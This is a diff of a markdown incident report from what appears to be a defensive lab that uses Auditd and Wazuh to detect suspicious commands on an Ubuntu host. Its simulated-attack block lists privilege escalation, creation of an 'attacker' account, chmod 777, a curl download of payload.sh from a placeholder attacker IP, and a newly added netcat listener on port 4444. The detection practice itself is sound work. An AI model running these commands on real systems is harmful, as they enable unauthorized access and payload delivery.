@@ -14,9 +14,9 @@ The investigation focused on identifying unauthorized administrative activity, s
 |---|---|
 | Detection Source | Auditd |
 | SIEM Platform | Wazuh |
-| Endpoint | Ubuntu Server |
+| Endpoint | Ubuntu Agent |
 | Activity Type | Suspicious Command Execution |
-| Severity | High |
+| Severity | Medium |
 
 ---
 
@@ -31,6 +31,7 @@ sudo su
 useradd attacker
 chmod 777 sensitivefile
 curl http://<attacker-ip>/payload.sh
+nc -lvnp 4444
 ```
 
 ---
@@ -60,6 +61,7 @@ Auditd successfully logged command execution activity, including user context, t
 
 ## MITRE ATT&CK Mapping
 
+
 | Tactic | Technique | ID |
 |---|---|---|
 | Execution | Command and Scripting Interpreter | T1059 |
@@ -70,34 +72,14 @@ Auditd successfully logged command execution activity, including user context, t
 
 ---
 
-## Indicators of Compromise (IOCs)
-
-| Type | Value |
-|---|---|
-| Process | bash |
-| Utility | curl |
-| Utility | wget |
-| Activity | User Creation |
-| Activity | Permission Modification |
-
----
-
 ## Evidence Collection
 
 ### Suspicious Command Execution
-(Add Screenshot)
+[Commands](../images/malicious-command.png)
 
-### Auditd Logs
-(Add Screenshot)
 
 ### Wazuh Alert Details
-(Add Screenshot)
-
-### MITRE ATT&CK Mapping
-(Add Screenshot)
-
-### Process Verification
-(Add Screenshot)
+[Alert Details](../images/auditd-alert-details.png)
 
 ---
 
